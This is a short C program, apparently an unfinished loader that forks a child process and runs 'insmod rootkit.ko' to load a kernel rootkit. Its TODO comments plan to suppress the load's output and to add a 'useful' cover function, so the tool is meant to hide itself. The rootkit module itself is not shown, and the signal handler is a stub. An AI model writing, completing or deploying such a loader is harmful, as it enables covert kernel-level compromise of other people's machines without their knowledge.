#include <signal.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>


void sigchld_handler(int signal) {
    switch (signal) {
        case SIGCHLD:
            // TODO wait
            break;
        default:
            break;
    }
}


int main() {
    struct sigaction sa;
    sa.sa_handler = sigchld_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;

    if (sigaction(SIGCHLD, &sa, NULL) == -1) {
        // Failed to sigaction
        // TODO do not load the rootkit?
    }

    char* payload[] = {"insmod", "rootkit.ko", NULL};
    pid_t pid = fork();
    if (pid == 0) {
        if (execvp(payload[0], payload) < 0) { // TODO suppress the output
            // Failed to load the rootkit
            exit(0);
        }
    }
    // TODO something "useful"
    return 0;
}